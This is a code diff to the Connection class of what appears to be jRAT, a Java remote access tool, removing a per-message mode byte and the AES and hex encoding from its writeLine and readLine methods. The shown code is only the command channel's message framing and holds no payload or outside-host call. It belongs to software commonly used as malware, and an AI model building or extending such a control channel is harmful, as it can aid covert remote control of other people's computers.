@@ -17,9 +17,7 @@ import javax.crypto.CipherInputStream;
 import javax.crypto.CipherOutputStream;
 import javax.crypto.spec.SecretKeySpec;
 
-import se.jrat.common.ConnectionCodes;
 import se.jrat.common.Version;
-import se.jrat.common.codec.Hex;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.common.crypto.KeyExchanger;
@@ -104,9 +102,7 @@ public class Connection implements Runnable {
 			Main.aesKey = Crypto.decrypt(encKey, Main.getKeyPair().getPrivate(), "RSA");
 					
 			SecretKeySpec secretKey = new SecretKeySpec(Main.aesKey, "AES");
-			
-			Main.encryption = inputStream.read() == 1;
-			
+						
 			Cipher inCipher = CryptoUtils.getCipher(Cipher.DECRYPT_MODE, secretKey);
 			Cipher outCipher = CryptoUtils.getCipher(Cipher.ENCRYPT_MODE, secretKey);
 			
@@ -210,22 +206,8 @@ public class Connection implements Runnable {
 
 	public static void writeLine(String s) {
 		try {
-			byte mode = 0;
-			
-			String enc = Crypto.encrypt(s, Main.getKey(), "AES");
-			if (enc.contains("\n")) {
-				mode = 1;
-				enc = Hex.encode(s);
-			}
-			if (s.startsWith("-c ") || !Main.encryption) {
-				mode = 2;
-				enc = s;
-			}
-
-			// dos.writeUTF(enc);
-			dos.writeByte(mode);
-			dos.writeShort(enc.length());
-			dos.writeChars(enc);
+			dos.writeShort(s.length());
+			dos.writeChars(s);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
@@ -233,7 +215,6 @@ public class Connection implements Runnable {
 
 	public static String readLine() {
 		try {
-			byte mode = dis.readByte();
 			short len = dis.readShort();
 
 			StringBuilder builder = new StringBuilder();
@@ -242,12 +223,6 @@ public class Connection implements Runnable {
 			}
 
 			String s = builder.toString();
-
-			if (mode == 1) {
-				s = Hex.decode(s);
-			} else if (mode == 0) {
-				s = Crypto.decrypt(s, Main.getKey(), "AES");
-			}
 
 			return s;
 		} catch (Exception e) {
